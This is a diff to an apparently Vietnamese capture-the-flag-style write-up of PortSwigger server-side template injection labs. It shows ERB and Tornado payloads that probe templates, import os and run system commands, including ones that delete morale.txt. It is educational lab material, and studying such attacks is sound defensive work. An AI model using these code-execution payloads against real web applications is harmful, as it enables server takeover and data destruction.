@@ -26,9 +26,75 @@ To solve the lab, review the ERB documentation to find out how to execute arbitr
 
 ![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/lab1_03.jpg)
 
-Vậy là đang ở trong thư mục /home/carlos . Để hoàn thành thì ls thử được file **morale.txt** . Việc còn lại để hoàn thành bài lab chỉ cần delete file là xong.
+#### Vậy là đang ở trong thư mục /home/carlos . Để hoàn thành thì ls thử được file **morale.txt** . Việc còn lại để hoàn thành bài lab chỉ cần delete file là xong.
 Dùng payload: ***<%= system('rm morale.txt) %>***
 
 ![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/lab1_04.jpg)
 
 ## Lab 2: Basic server-side template injection (code context)
+
+```
+ This lab is vulnerable to server-side template injection due to the way it unsafely uses a Tornado template. To solve the lab, review the Tornado documentation to discover how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.
+
+You can log in to your own account using the following credentials: wiener:peter 
+
+```
+
+#### Bài lab này cần đăng nhập tài khoản, wiener:peter . Sau khi đăng nhập thì check thử phần my account, ta thấy có phần update email với phần preferrd name có thể thực hiện giao thức POST. 
+
+![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/lab2_01.jpg)
+
+Thử để giá trị ***first name*** và ***name*** và check phần comment thử: 
+
+![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/lab2_02.jpg)
+
+![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/lab2_03.jpg)
+
+Rõ ràng là server đã dùng tags để xử lí logic qua template engine, cụ thể ở đây là template Tornado. Cụ thể ta có check ở burp suite sau khi sửa dổi phần ***preferred name*** thành ***username***và ***submit*** được như sau:
+
+![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/lab2_04.jpg)
+
+Để ý thấy phần display=user.username, đúng chuẩn xử lí tags trong template engine luôn, đến đây thay bằng 1 sô payload của Tornado ssti như sau:
+
+
+```
+{{7*7}} = 49
+${7*7} = ${7*7}
+{{foobar}} = Error
+{{7*'7'}} = 7777777
+______
+{% import foobar %} = Error
+{% import os %}
+
+{% import os %}
+
+{{os.system('whoami')}}
+{{os.system('whoami')}}
+_______
+
+```
+Vì user.username đã ở sẵn trong filters (chuyển hóa các giá trị của biến và đối số trong tags) có dạng {{}} nên test chỉ việc dùng 7*7 thay vào chỗ user.username. Ta được:
+
+![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/lab2_05.jpg)
+
+#### Bây giờ thực hiện code để xóa file morale.txt thôi nào: 
+
+Dùng payload sau để hiển thị đường dẫn thư mục hiện tại:
+
+```
+{% import os %}
+
+{{os.system('whoami')}}
+
+```
+Lúc đầu thử truyền vào giá trị {%+import+os+%}+{{os.system('pwd')}} thì toàn hiển thị lỗi, sau 1 lúc thử lại thì nhớ ra là biến đang được xử lí trong filter/tags {{}} . Vì vậy để truyền vào giá trị trên thì cần sửa payload như sau: ***user.nickname}}{%+import+os+%}+{{os.system('pwd')*** . Lúc này template engine sẽ xử lí: {{user.nickname}} {% import os %} và {{os.system('pwd'}}. Ta được:
+
+![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/lab2_06.jpg)
+
+#### Đến đây thì tương tự như bài trên, đang ở đường dẫn: /home/carlos nên sửa pwd thành ls sẽ có file morale.txt được hiển thị. Để giải quyết bài lab, sửa payload thành : 
+
+```
+***user.nickname}}{%+import+os+%}+{{os.system('rm morale.txt')*** 
+```
+
+Như vậy là ta đã xóa được file morale.txt như bài lab mong muốn.
